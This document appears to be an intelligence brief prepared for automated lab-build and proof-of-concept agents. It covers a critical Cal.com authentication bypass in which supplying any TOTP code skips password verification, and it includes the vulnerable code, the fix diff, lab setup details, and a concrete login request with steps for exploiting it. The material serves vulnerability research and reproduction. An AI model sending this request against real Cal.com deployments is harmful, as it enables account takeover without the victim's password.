# Intel Brief: CVE-2025-66489

## CVE Overview

| Field | Value |
|---|---|
| **CVE ID** | CVE-2025-66489 |
| **Title** | Cal.com Authentication Bypass via TOTP Code Injection |
| **Affected Software** | Cal.com (open-source scheduling platform) |
| **Vendor** | cal / calcom |
| **CVSS Score** | 9.8 (Critical) |
| **CVSS Vector** | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **CWE** | CWE-303 (Incorrect Implementation of Authentication Algorithm) |
| **Published** | 2025-12-03 |
| **EPSS** | 0.1% (35.5th percentile) |

## Description

A flaw in Cal.com's NextAuth credentials provider `authorize()` function allows an attacker to **bypass password verification** by supplying any value in the `totpCode` field during login. The vulnerability exists in the file `packages/features/auth/lib/next-auth-options.ts` (lines 172-187 in v5.9.7).

### Root Cause

The vulnerable conditional logic at line 179:

```typescript
if (user.password?.hash && !credentials.totpCode) {
    // Password verification ONLY happens here
    const isCorrectPassword = await verifyPassword(credentials.password, user.password.hash);
    if (!isCorrectPassword) {
        throw new Error(ErrorCode.IncorrectEmailPassword);
    }
}
```

Password verification is **gated behind `!credentials.totpCode`** — meaning if the attacker supplies **any** `totpCode` value (even a random string), the password check is entirely skipped.

### Attack Scenarios

1. **Against users WITHOUT 2FA enabled**: An attacker needs only a valid email address and any arbitrary `totpCode` value. No password or valid TOTP secret is required. After the password check is bypassed, the code falls through to the 2FA section, which checks `user.twoFactorEnabled` — since it's `false`, the check is skipped entirely and login succeeds.

2. **Against users WITH 2FA enabled**: The attacker still bypasses the password check but must supply a valid TOTP code (6-digit code from the user's authenticator). This eliminates the password as a factor, reducing 2FA to single-factor authentication.

### Vulnerable Code Flow (v5.9.7)

```
1. User lookup by email ✓
2. Check user locked ✓
3. Rate limit check ✓
4. Line 172: if (!user.password?.hash && user.identityProvider !== CAL && !credentials.totpCode) → throw
5. Line 175: if (!user.password?.hash && user.identityProvider == CAL) → throw
6. Line 179: if (user.password?.hash && !credentials.totpCode) → SKIP if totpCode provided
   └── Password verification happens ONLY inside this block
7. Line 189: if (user.twoFactorEnabled && credentials.backupCode) → 2FA backup check
8. Line 215: else if (user.twoFactorEnabled) → TOTP check (skipped if 2FA not enabled)
9. Authentication succeeds ← BYPASS COMPLETE
```

## Affected Versions

| Version | Status |
|---|---|
| **< 5.9.8** | Vulnerable |
| **5.9.7** | Last vulnerable release |
| **5.9.8** | First patched release |

## Repository Information

| Field | Value |
|---|---|
| **Repository URL** | https://github.com/calcom/cal.com.git |
| **Vulnerable Version Tag** | `v5.9.7` (commit `8167fe0d05`) |
| **Fix Commit** | `63d1361a7a999e7613a55d4fefbf6dbabab9eb11` |
| **Patched Version Tag** | `v5.9.8` |
| **Fix PR** | #25563 |
| **Vulnerable File** | `packages/features/auth/lib/next-auth-options.ts` |
| **Vulnerable Lines** | 172-187 (in v5.9.7) |

## Fix Analysis

The fix (commit `63d1361a7a`) simplifies the authentication logic:

**Before (vulnerable):**
```typescript
if (!user.password?.hash && user.identityProvider !== IdentityProvider.CAL && !credentials.totpCode) {
    throw new Error(ErrorCode.IncorrectEmailPassword);
}
if (!user.password?.hash && user.identityProvider == IdentityProvider.CAL) {
    throw new Error(ErrorCode.IncorrectEmailPassword);
}

if (user.password?.hash && !credentials.totpCode) {
    if (!user.password?.hash) {
        throw new Error(ErrorCode.IncorrectEmailPassword);
    }
    const isCorrectPassword = await verifyPassword(credentials.password, user.password.hash);
    if (!isCorrectPassword) {
        throw new Error(ErrorCode.IncorrectEmailPassword);
    }
}
```

**After (fixed):**
```typescript
// Users without a password must use their identity provider (Google/SAML) to login
if (!user.password?.hash) {
    throw new Error(ErrorCode.IncorrectEmailPassword);
}

// Always verify password for users who have one
const isCorrectPassword = await verifyPassword(credentials.password, user.password.hash);
if (!isCorrectPassword) {
    throw new Error(ErrorCode.IncorrectEmailPassword);
}
```

Key changes:
1. Removed all `credentials.totpCode` conditions from the password verification path
2. Password verification is now **unconditional** for users with a password hash
3. Simplified from 3 conditional blocks to 2 clean checks

## Build System & Dependencies

| Field | Value |
|---|---|
| **Primary Language** | TypeScript (Node.js) |
| **Framework** | Next.js (App Router + Pages Router) |
| **Package Manager** | Yarn 3.4.1 |
| **Build Tool** | Turbo (monorepo) |
| **Base Docker Image** | `node:20` |
| **Database** | PostgreSQL (via Prisma ORM) |
| **ORM** | Prisma (with `prisma-client` engine) |
| **Auth Library** | NextAuth.js |
| **Key Services** | PostgreSQL, Redis |

### Key Dependencies for Lab Build
- Node.js 20
- PostgreSQL (database)
- Redis (optional, for caching)
- Prisma (ORM, needs `DATABASE_URL`)
- NextAuth.js (authentication framework)
- `@calcom/lib` (password hashing via `verifyPassword`)

### Environment Variables Required
- `DATABASE_URL` — PostgreSQL connection string
- `NEXTAUTH_SECRET` — NextAuth session secret
- `CALENDSO_ENCRYPTION_KEY` — For 2FA secret encryption
- `NEXT_PUBLIC_WEBAPP_URL` — Public-facing URL

## Exploit Endpoint

The vulnerable authentication endpoint is:

```
POST /api/auth/callback/credentials
Content-Type: application/x-www-form-urlencoded

email=victim@example.com&password=anything&totpCode=123456&csrfToken=<token>
```

The NextAuth credentials provider is exposed via the Pages Router catch-all at:
`apps/web/pages/api/auth/[...nextauth].ts`

### PoC Attack Flow

1. Obtain a valid CSRF token: `GET /api/auth/csrf`
2. Send login request with any `totpCode` value:
   ```
   POST /api/auth/callback/credentials
   email=<victim_email>&password=wrong&totpCode=000000&csrfToken=<token>
   ```
3. For non-2FA users: Login succeeds, session cookie returned
4. Password is never checked because `credentials.totpCode` is truthy

## Public Exploits

**No public exploits found** in ExploitDB, Metasploit, GitHub, or Nuclei templates as of the intel gathering date.

## References

1. **Security Advisory**: https://github.com/calcom/cal.com/security/advisories/GHSA-9r3w-4j8q-pw98
2. **Fix Commit**: https://github.com/calcom/cal.com/commit/63d1361a7a999e7613a55d4fefbf6dbabab9eb11
3. **Fix PR**: https://github.com/calcom/cal.com/pull/25563
4. **Source Repository**: https://github.com/calcom/cal.com
5. **NVD Entry**: https://nvd.nist.gov/vuln/detail/CVE-2025-66489

## Notes for Downstream Agents

### For Lab Build Agent
- The project ships with a `Dockerfile` and `docker-compose.yml` at the repository root
- Requires PostgreSQL and optionally Redis
- The vulnerable code is in the NextAuth credentials provider — the web app must be running and serving `/api/auth/*` routes
- Prisma schema is at `packages/prisma/schema.prisma` — needs `npx prisma migrate deploy` or `npx prisma db push`
- Minimum env vars: `DATABASE_URL`, `NEXTAUTH_SECRET`, `CALENDSO_ENCRYPTION_KEY`
- Consider using the existing `docker-compose.yml` as a base, targeting `v5.9.7`

### For PoC Agent
- The exploit is trivial: a single HTTP POST to `/api/auth/callback/credentials` with a `totpCode` field
- A valid user email must exist in the database (create one during lab setup)
- The CSRF token is required — fetch it first from `/api/auth/csrf`
- Verify success by checking for a session cookie (`next-auth.session-token`) in the response
- Compare behavior with and without `totpCode` to demonstrate the bypass
- The fix is deterministic — the same request should fail on v5.9.8
